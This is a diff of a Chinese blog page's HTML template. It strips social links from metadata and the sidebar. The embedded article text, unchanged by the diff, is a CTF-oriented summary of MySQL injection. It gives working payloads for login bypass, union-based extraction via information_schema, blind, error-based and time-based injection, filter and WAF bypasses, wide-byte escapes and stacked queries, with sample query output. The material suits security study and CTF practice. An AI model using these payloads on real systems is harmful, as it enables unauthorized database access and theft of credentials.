@@ -11,7 +11,7 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"先来说说几种注入方式万能密码 union联合查询  盲注  报错注入 宽字节注入 \n\n\n\n\nunion联合查询123union selectunion all select 允许重复值  要是union select 被过滤了可以使用这种方式\n\n万能密码假设原始查询语句为select * from user where username=&#39;$_POST[&#39;username&#39;]&#39; and password=&#39;$_POST[&#39;password&#39;]&#39;;这时我们把 $username赋值为’=’select * from user where username=’’=’’ and password=’’=’’;先来看username这一段，password同理把username=’’=’’分成两部分，第一部分username=’’  第二部分=’’数据库中不可能有为空的用户名(要是有，就在换一个用户名，直到没有为止)，这样第一部分的返回结果肯定为flase 然后flase=’’也就是flase=flase;结果为1.最后相当于select * from user where 1 and 1;\nunion 联合查询前后的列数必须一致，可以通过order by猜测出列数。还有一点是要知道哪一列是回显列。知道这些条件后，就可以利用系统自带的库information_schema得到库名，表名和列名，也可以使用database()直接得到库名\n123union select schema_name from information_schema.schemata %23 爆库名union select table_name from information_schema.tables where table_schema=database()%23爆表名union select column_name from information_schema.columns where table_name='xxx' %23爆列名\n\n最后得到内容 union select xxx from xxx %23\n最后得到内容 union select xxx from xxx %23\n盲注不回显数据，一般回显只有两种情况，用户名错误或密码错误，使用这几个函数来截取字符串mid() substr()ascii()返回ASCII值 ,若为字符串则默认返回第一个字符的ASCII值盲注时，两条语句之间要使用and or 来进行连接。and or 被过滤可以使用’-0-‘admin’-0-‘这里使用了一个mysql的一个数据类型转换的特性，前面的admin为字符类型，后面的0为数字类型，mysql会把admin转为数字型，变成0。在与0相减，结果为0，这里还有一个小知识，如果sql查询的数据类型为字符型，但我们传给他一个整型0的话，就会把所有数据爆出来 \n1234567891011121314151617mysql&gt; select * from user where name=0;+-----+--------+------+----------+-----------+| id  | name   | sex  | date     | dream     |+-----+--------+------+----------+-----------+|   1 | testdu |      | 19930916 | coder     ||   2 | Lee    |      | 19920916 | coder     ||   3 | Yjh    |      | 19950916 | coder     ||   4 | Wk     |      | 19990916 | coder     ||   5 | Wk     |      | 19980916 | moveZhuan ||   6 | 00     | 女   | 20010916 | moveZhuan || 166 | hhh    | NULL | 19990803 | coder     || 167 | sdf    |      | 20190522 | programer || 168 | uyu    |      | 20190521 | manger    || 169 | ssu    |      | 20190521 | manger    || 170 | xm     |      | 20190532 | ceo       |+-----+--------+------+----------+-----------+11 rows in set, 7 warnings (0.37 sec)\n\n所以我们的payload可以这样构造\n1admin&apos;-(ascii(substr((database()),1,1))=0x74)-&apos;\n\n但是大多数ctf题并不会这么顺利直接，都会存在一定的过滤，下面就来说说，绕过过滤的一些方法。\n绕过方法双写绕过,利用被过滤掉的字符，如果/\\/，union被过滤，可以使用unio/**/n  uniunionon绕过过滤\n空格 () %0a %0b %0c  ``\n123456789101112131415161718select/**/name/**/from/**/testselect%0aname%0afrom%0atestselect(name)from(test) select`name`from`test`mysql&gt; select name from user where id&gt;1 and id&lt;3;+------+| name |+------+| Lee  |+------+1 row in set (0.00 sec)mysql&gt; select name from user where !(id&lt;&gt;2);+------+| name |+------+| Lee  |+------+1 row in set (0.00 sec)\n\n=  可以使用&lt;&gt; 单独使用是大于或者是小于，两个连在一起使用是不等于的意思，在前面加上!就构成了=select name from test where id&gt;1 and id&lt;3;这样就构成了id=2\n1234567mysql&gt; select name from user where id&gt;1 and id&lt;3;+------+| name |+------+| Lee  |+------+1 row in set (0.00 sec)\n\n如果大小于号&lt;&gt;也被被过滤，可以使用greatest(n1,n2,n3….)返回n中最大值least(n1,n2,n3…)返回n中最小值strcmp(str1,str2)比较两个字符串，若两个字符串相等则返回0，根据当前排序顺序比较若str1&gt;str2则返回-1，否则返回1\n123456789101112131415mysql&gt; select name from user where id=1 and greatest(ascii(substr(name,1,1)),1)=0x74;+--------+| name   |+--------+| testdu |+--------+1 row in set (0.00 sec)mysql&gt; select name from user where id=1 and strcmp(ascii(substr(name,1,1)),0x74);+--------+| name   |+--------+| testdu |+--------+1 row in set (0.00 sec)\n\nlike rlike regexp 进行匹配\n12345678910mysql&gt; select * from user where name=&apos;hhh&apos; or dream regexp &apos;co&apos;;+-----+--------+------+----------+-------+| id  | name   | sex  | date     | dream |+-----+--------+------+----------+-------+|   1 | testdu |      | 19930916 | coder ||   2 | Lee    |      | 19920916 | coder ||   3 | Yjh    |      | 19950916 | coder ||   4 | Wk     |      | 19990916 | coder || 166 | hhh    | NULL | 19990803 | coder |+-----+--------+------+----------+-------+\n\n逗号,被过滤 可以使用join case when  if  from for  limit offset\n123select name from test where id=1 limit 0,1 ==&gt;select name from test where id=1 limit 1 offset 0;select substr(database(),1,2)==&gt; select substr(database() from 1 for 2);select * from test union select (select 1)a join (select 2)b join (select 3)c ==&gt; select * from test union select 1,2,3\n\n逗号,被过滤 可以使用join case when  if  from for  limit offsetselect name from test where id=1 limit 0,1 ==&gt;select name from test where id=1 limit 1 offset 0;select substr(database(),1,2)==&gt; select substr(database() from 1 for 2);select * from test union select (select 1)a join (select 2)b join (select 3)c ==&gt; select * from test union select 1,2,3\n异或注入异或注入主要是用来检测字符是否被过滤在id=1后面输入 ‘ ^ (0)–+           ‘ ^ (length(select)=6)–+利用1^1返回0 1^0返回1来判断字符是否被过滤，同时也可以利用他来进行盲注\n报错注入几个比较常见的报错方式，exp，floor等等 网上一大堆，这里就不细说了，主要说说另一种报错注入如果我们碰到一种情况，可以使用报错注入，但是不回显数据，只回显用户名/密码错误，数据库操作错误这时怎么办呢？这时就要用到我们的报错+盲注了exp函数报错的原理是参数大于709，\n123456789mysql&gt; select exp(709);+-----------------------+| exp(709)              |+-----------------------+| 8.218407461554972e307 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select exp(710);ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(710)&apos;\n\n所以我们可以构造exp(709+c-ascii())，c的值从126依次递减，这样当ascii返回的数据如果和c的值正好相等，那么爆出用户名/密码错误，c的值大于ascii的话，exp函数的参数大于709，爆出数据库错误这样就可以实现盲注+报错注入。 \n未知列名有时我们可以得到他的表名，库名，但是在爆列名的时候，被过滤掉了，无法得到列名。或者知道列名，但是在使用时被过滤掉了，十六进制也被过滤掉了这时可以使用未知列名注入方法\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546mysql&gt; select (select 1)a,(select 2)b;+---+---+| a | b |+---+---+| 1 | 2 |+---+---+1 row in set (0.00 sec)//使用别名代替字段名 a,b为别名select name,dream from user union select username,password from users;+---------------------------+---------------+| name                      | dream         |+---------------------------+---------------+| testdu                    | coder         || Lee                       | coder         || Yjh                       | coder         || Wk                        | coder         || Wk                        | moveZhuan     || 00                        | moveZhuan     || hhh                       | coder         || vampire                   | my_password   || vampire                   | password_name |+---------------------------+---------------+9 rows in set (0.00 sec)//使用union将两张表的查询结果连起来，前七行数据为user表中的数据，后两行为users中的数据 select * from (select 1)a,(select 2)b,(select 3+1)c;+---+---+-----+| 1 | 2 | 3+1 |+---+---+-----+| 1 | 2 |   4 |+---+---+-----+1 row in set (0.00 sec)   //在select 1查询完成之后，给查询之后的结果(也是一张表)mysql&gt; select 1;+---+| 1 |+---+| 1 |+---+1 row in set (0.00 sec)   起了个别名叫a。select e.2 from (select * from (select 1)a,(select 2)b union select * from users)e;+---------------+| 2             |+---------------+| 2             || my_password   || password_name |+---------------+3 rows in set (0.00 sec) //这里ab..的列数必须和users表中的列数一样\n\n宽字节注入WAF会对我们的’转义形成&#39;，但是我们在前面加上%df后，因为\\的编码为%5c，这样mysql会认为df5c是一个汉字，是我们的’逃逸出来\n最后在啰嗦一句，有时我们会碰到，对数据长度的输出有限制的情况。可以使用group_concat()把数据一次性爆出。\n123456mysql&gt; select group_concat(date) from user;+----------------------------------------------------------------------------------------------------+| group_concat(date)                                                                                 |+----------------------------------------------------------------------------------------------------+| 19930916,19920916,19950916,19990916,19980916,20010916,19990803,20190522,20190521,20190521,20190532 |+----------------------------------------------------------------------------------------------------+\n\n堆叠查询用set预处理语句，实现注入\nSet @sql=concat(‘sel’,’ect * from `1919810931114514`’);Prepare psql from @sql;execute psql;deallocate Prepare psql;\nOracle中||可以连接字符串 MySQL中需要设置一下，才可以连接字符串\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859mysql&gt; show variables like &apos;%sql_mode%&apos;;+---------------+--------------------------------------------+| Variable_name | Value                                      |+---------------+--------------------------------------------+| sql_mode      | NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION |+---------------+--------------------------------------------+**设置sql_mode**mysql&gt; set sql_mode=pipes_as_concat;Query OK, 0 rows affected (0.00 sec)**查看是否设置成功**mysql&gt; show variables like &apos;%sql_mode%&apos;;+---------------+-----------------+| Variable_name | Value           |+---------------+-----------------+| sql_mode      | PIPES_AS_CONCAT |+---------------+-----------------+**验证一下**mysql&gt; select &apos;w&apos;||&apos;e&apos;;+----------+| &apos;w&apos;||&apos;e&apos; |+----------+| we       |+----------+**这里注意一点如果是整形和字符串相连的话，有个特殊的 0||a ==&gt; 0 其他的都是1**mysql&gt; select 0||&apos;a&apos;;+--------+| 0||&apos;a&apos; |+--------+|      0 |+--------+\n\n\n\n==2019.9.18补充==\nFIELD   ELT用法介绍\nFIELD返回字符串的位置索引值从1开始\n1234567mysql&gt; select field('sqd','wer','halo','uyt','sqd');+---------------------------------------+| field('sqd','wer','halo','uyt','sqd') |+---------------------------------------+|                                     4 |+---------------------------------------+1 row in set (0.00 sec)\n\nELT返回索引值对应的字符串\n1234567mysql&gt; select elt(2,'wer','halo','uyt','sqd');+---------------------------------+| elt(2,'wer','halo','uyt','sqd') |+---------------------------------+| halo                            |+---------------------------------+1 row in set (0.00 sec)\n\n注入利用FIELD1(select (case field(concat(substring(bin(ascii(substring(password,1,1))),1,1),substring(bin(ascii(substring(password,1,1))),2,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end)\n\nELT12\n\n一些trick数据区的内容被过滤，可以使用char 还有16进制\n字符特性 utf8_unicode_ci 和 utf8_general_ci 两种编码格式Ö = O\n注释符可以起到注释符作用的构造\n12345678%23and &apos;1&apos;=&apos;1and &apos;1;%00-- -  保证--后面有个空格%0a%1a\n\n","dateCreated":"2019-09-11T09:38:01+08:00","dateModified":"2019-10-25T22:00:56+08:00","datePublished":"2019-09-11T09:38:01+08:00","description":"先来说说几种注入方式万能密码 union联合查询  盲注  报错注入 宽字节注入 ","headline":"ctf中的mysql注入总结","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/11/ctf中的mysql注入总结/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://yoursite.com/2019/09/11/ctf中的mysql注入总结/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"先来说说几种注入方式万能密码 union联合查询  盲注  报错注入 宽字节注入 \n\n\n\n\nunion联合查询123union selectunion all select 允许重复值  要是union select 被过滤了可以使用这种方式\n\n万能密码假设原始查询语句为select * from user where username=&#39;$_POST[&#39;username&#39;]&#39; and password=&#39;$_POST[&#39;password&#39;]&#39;;这时我们把 $username赋值为’=’select * from user where username=’’=’’ and password=’’=’’;先来看username这一段，password同理把username=’’=’’分成两部分，第一部分username=’’  第二部分=’’数据库中不可能有为空的用户名(要是有，就在换一个用户名，直到没有为止)，这样第一部分的返回结果肯定为flase 然后flase=’’也就是flase=flase;结果为1.最后相当于select * from user where 1 and 1;\nunion 联合查询前后的列数必须一致，可以通过order by猜测出列数。还有一点是要知道哪一列是回显列。知道这些条件后，就可以利用系统自带的库information_schema得到库名，表名和列名，也可以使用database()直接得到库名\n123union select schema_name from information_schema.schemata %23 爆库名union select table_name from information_schema.tables where table_schema=database()%23爆表名union select column_name from information_schema.columns where table_name='xxx' %23爆列名\n\n最后得到内容 union select xxx from xxx %23\n最后得到内容 union select xxx from xxx %23\n盲注不回显数据，一般回显只有两种情况，用户名错误或密码错误，使用这几个函数来截取字符串mid() substr()ascii()返回ASCII值 ,若为字符串则默认返回第一个字符的ASCII值盲注时，两条语句之间要使用and or 来进行连接。and or 被过滤可以使用’-0-‘admin’-0-‘这里使用了一个mysql的一个数据类型转换的特性，前面的admin为字符类型，后面的0为数字类型，mysql会把admin转为数字型，变成0。在与0相减，结果为0，这里还有一个小知识，如果sql查询的数据类型为字符型，但我们传给他一个整型0的话，就会把所有数据爆出来 \n1234567891011121314151617mysql&gt; select * from user where name=0;+-----+--------+------+----------+-----------+| id  | name   | sex  | date     | dream     |+-----+--------+------+----------+-----------+|   1 | testdu |      | 19930916 | coder     ||   2 | Lee    |      | 19920916 | coder     ||   3 | Yjh    |      | 19950916 | coder     ||   4 | Wk     |      | 19990916 | coder     ||   5 | Wk     |      | 19980916 | moveZhuan ||   6 | 00     | 女   | 20010916 | moveZhuan || 166 | hhh    | NULL | 19990803 | coder     || 167 | sdf    |      | 20190522 | programer || 168 | uyu    |      | 20190521 | manger    || 169 | ssu    |      | 20190521 | manger    || 170 | xm     |      | 20190532 | ceo       |+-----+--------+------+----------+-----------+11 rows in set, 7 warnings (0.37 sec)\n\n所以我们的payload可以这样构造\n1admin&apos;-(ascii(substr((database()),1,1))=0x74)-&apos;\n\n但是大多数ctf题并不会这么顺利直接，都会存在一定的过滤，下面就来说说，绕过过滤的一些方法。\n绕过方法双写绕过,利用被过滤掉的字符，如果/\\/，union被过滤，可以使用unio/**/n  uniunionon绕过过滤\n空格 () %0a %0b %0c  ``\n123456789101112131415161718select/**/name/**/from/**/testselect%0aname%0afrom%0atestselect(name)from(test) select`name`from`test`mysql&gt; select name from user where id&gt;1 and id&lt;3;+------+| name |+------+| Lee  |+------+1 row in set (0.00 sec)mysql&gt; select name from user where !(id&lt;&gt;2);+------+| name |+------+| Lee  |+------+1 row in set (0.00 sec)\n\n=  可以使用&lt;&gt; 单独使用是大于或者是小于，两个连在一起使用是不等于的意思，在前面加上!就构成了=select name from test where id&gt;1 and id&lt;3;这样就构成了id=2\n1234567mysql&gt; select name from user where id&gt;1 and id&lt;3;+------+| name |+------+| Lee  |+------+1 row in set (0.00 sec)\n\n如果大小于号&lt;&gt;也被被过滤，可以使用greatest(n1,n2,n3….)返回n中最大值least(n1,n2,n3…)返回n中最小值strcmp(str1,str2)比较两个字符串，若两个字符串相等则返回0，根据当前排序顺序比较若str1&gt;str2则返回-1，否则返回1\n123456789101112131415mysql&gt; select name from user where id=1 and greatest(ascii(substr(name,1,1)),1)=0x74;+--------+| name   |+--------+| testdu |+--------+1 row in set (0.00 sec)mysql&gt; select name from user where id=1 and strcmp(ascii(substr(name,1,1)),0x74);+--------+| name   |+--------+| testdu |+--------+1 row in set (0.00 sec)\n\nlike rlike regexp 进行匹配\n12345678910mysql&gt; select * from user where name=&apos;hhh&apos; or dream regexp &apos;co&apos;;+-----+--------+------+----------+-------+| id  | name   | sex  | date     | dream |+-----+--------+------+----------+-------+|   1 | testdu |      | 19930916 | coder ||   2 | Lee    |      | 19920916 | coder ||   3 | Yjh    |      | 19950916 | coder ||   4 | Wk     |      | 19990916 | coder || 166 | hhh    | NULL | 19990803 | coder |+-----+--------+------+----------+-------+\n\n逗号,被过滤 可以使用join case when  if  from for  limit offset\n123select name from test where id=1 limit 0,1 ==&gt;select name from test where id=1 limit 1 offset 0;select substr(database(),1,2)==&gt; select substr(database() from 1 for 2);select * from test union select (select 1)a join (select 2)b join (select 3)c ==&gt; select * from test union select 1,2,3\n\n逗号,被过滤 可以使用join case when  if  from for  limit offsetselect name from test where id=1 limit 0,1 ==&gt;select name from test where id=1 limit 1 offset 0;select substr(database(),1,2)==&gt; select substr(database() from 1 for 2);select * from test union select (select 1)a join (select 2)b join (select 3)c ==&gt; select * from test union select 1,2,3\n异或注入异或注入主要是用来检测字符是否被过滤在id=1后面输入 ‘ ^ (0)–+           ‘ ^ (length(select)=6)–+利用1^1返回0 1^0返回1来判断字符是否被过滤，同时也可以利用他来进行盲注\n报错注入几个比较常见的报错方式，exp，floor等等 网上一大堆，这里就不细说了，主要说说另一种报错注入如果我们碰到一种情况，可以使用报错注入，但是不回显数据，只回显用户名/密码错误，数据库操作错误这时怎么办呢？这时就要用到我们的报错+盲注了exp函数报错的原理是参数大于709，\n123456789mysql&gt; select exp(709);+-----------------------+| exp(709)              |+-----------------------+| 8.218407461554972e307 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select exp(710);ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(710)&apos;\n\n所以我们可以构造exp(709+c-ascii())，c的值从126依次递减，这样当ascii返回的数据如果和c的值正好相等，那么爆出用户名/密码错误，c的值大于ascii的话，exp函数的参数大于709，爆出数据库错误这样就可以实现盲注+报错注入。 \n未知列名有时我们可以得到他的表名，库名，但是在爆列名的时候，被过滤掉了，无法得到列名。或者知道列名，但是在使用时被过滤掉了，十六进制也被过滤掉了这时可以使用未知列名注入方法\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546mysql&gt; select (select 1)a,(select 2)b;+---+---+| a | b |+---+---+| 1 | 2 |+---+---+1 row in set (0.00 sec)//使用别名代替字段名 a,b为别名select name,dream from user union select username,password from users;+---------------------------+---------------+| name                      | dream         |+---------------------------+---------------+| testdu                    | coder         || Lee                       | coder         || Yjh                       | coder         || Wk                        | coder         || Wk                        | moveZhuan     || 00                        | moveZhuan     || hhh                       | coder         || vampire                   | my_password   || vampire                   | password_name |+---------------------------+---------------+9 rows in set (0.00 sec)//使用union将两张表的查询结果连起来，前七行数据为user表中的数据，后两行为users中的数据 select * from (select 1)a,(select 2)b,(select 3+1)c;+---+---+-----+| 1 | 2 | 3+1 |+---+---+-----+| 1 | 2 |   4 |+---+---+-----+1 row in set (0.00 sec)   //在select 1查询完成之后，给查询之后的结果(也是一张表)mysql&gt; select 1;+---+| 1 |+---+| 1 |+---+1 row in set (0.00 sec)   起了个别名叫a。select e.2 from (select * from (select 1)a,(select 2)b union select * from users)e;+---------------+| 2             |+---------------+| 2             || my_password   || password_name |+---------------+3 rows in set (0.00 sec) //这里ab..的列数必须和users表中的列数一样\n\n宽字节注入WAF会对我们的’转义形成&#39;，但是我们在前面加上%df后，因为\\的编码为%5c，这样mysql会认为df5c是一个汉字，是我们的’逃逸出来\n最后在啰嗦一句，有时我们会碰到，对数据长度的输出有限制的情况。可以使用group_concat()把数据一次性爆出。\n123456mysql&gt; select group_concat(date) from user;+----------------------------------------------------------------------------------------------------+| group_concat(date)                                                                                 |+----------------------------------------------------------------------------------------------------+| 19930916,19920916,19950916,19990916,19980916,20010916,19990803,20190522,20190521,20190521,20190532 |+----------------------------------------------------------------------------------------------------+\n\n堆叠查询用set预处理语句，实现注入\nSet @sql=concat(‘sel’,’ect * from `1919810931114514`’);Prepare psql from @sql;execute psql;deallocate Prepare psql;\nOracle中||可以连接字符串 MySQL中需要设置一下，才可以连接字符串\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859mysql&gt; show variables like &apos;%sql_mode%&apos;;+---------------+--------------------------------------------+| Variable_name | Value                                      |+---------------+--------------------------------------------+| sql_mode      | NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION |+---------------+--------------------------------------------+**设置sql_mode**mysql&gt; set sql_mode=pipes_as_concat;Query OK, 0 rows affected (0.00 sec)**查看是否设置成功**mysql&gt; show variables like &apos;%sql_mode%&apos;;+---------------+-----------------+| Variable_name | Value           |+---------------+-----------------+| sql_mode      | PIPES_AS_CONCAT |+---------------+-----------------+**验证一下**mysql&gt; select &apos;w&apos;||&apos;e&apos;;+----------+| &apos;w&apos;||&apos;e&apos; |+----------+| we       |+----------+**这里注意一点如果是整形和字符串相连的话，有个特殊的 0||a ==&gt; 0 其他的都是1**mysql&gt; select 0||&apos;a&apos;;+--------+| 0||&apos;a&apos; |+--------+|      0 |+--------+\n\n\n\n==2019.9.18补充==\nFIELD   ELT用法介绍\nFIELD返回字符串的位置索引值从1开始\n1234567mysql&gt; select field('sqd','wer','halo','uyt','sqd');+---------------------------------------+| field('sqd','wer','halo','uyt','sqd') |+---------------------------------------+|                                     4 |+---------------------------------------+1 row in set (0.00 sec)\n\nELT返回索引值对应的字符串\n1234567mysql&gt; select elt(2,'wer','halo','uyt','sqd');+---------------------------------+| elt(2,'wer','halo','uyt','sqd') |+---------------------------------+| halo                            |+---------------------------------+1 row in set (0.00 sec)\n\n注入利用FIELD1(select (case field(concat(substring(bin(ascii(substring(password,1,1))),1,1),substring(bin(ascii(substring(password,1,1))),2,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end)\n\nELT12\n\n一些trick数据区的内容被过滤，可以使用char 还有16进制\n字符特性 utf8_unicode_ci 和 utf8_general_ci 两种编码格式Ö = O\n注释符可以起到注释符作用的构造\n12345678%23and &apos;1&apos;=&apos;1and &apos;1;%00-- -  保证--后面有个空格%0a%1a\n\n","dateCreated":"2019-09-11T09:38:01+08:00","dateModified":"2019-10-25T22:00:56+08:00","datePublished":"2019-09-11T09:38:01+08:00","description":"先来说说几种注入方式万能密码 union联合查询  盲注  报错注入 宽字节注入 ","headline":"ctf中的mysql注入总结","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/11/ctf中的mysql注入总结/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/09/11/ctf中的mysql注入总结/"}</script>
     <meta name="description" content="先来说说几种注入方式万能密码 union联合查询  盲注  报错注入 宽字节注入">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="ctf中的mysql注入总结">
@@ -164,138 +164,6 @@
                         >
                         <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                         <span class="sidebar-button-desc">关于</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://github.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="GitHub"
-                        >
-                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">GitHub</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="http://stackoverflow.com/users"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Stack Overflow"
-                        >
-                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Stack Overflow</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://twitter.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Twitter"
-                        >
-                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Twitter</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://facebook.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Facebook"
-                        >
-                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Facebook</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://plus.google.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Google Plus"
-                        >
-                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Google Plus</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://www.linkedin.com/profile/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="LinkedIn"
-                        >
-                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">LinkedIn</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/mailto"
-                            
-                            rel="noopener"
-                            title="邮箱"
-                        >
-                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">邮箱</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/atom.xml"
-                            
-                            rel="noopener"
-                            title="RSS"
-                        >
-                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">RSS</span>
                     </a>
             </li>
             
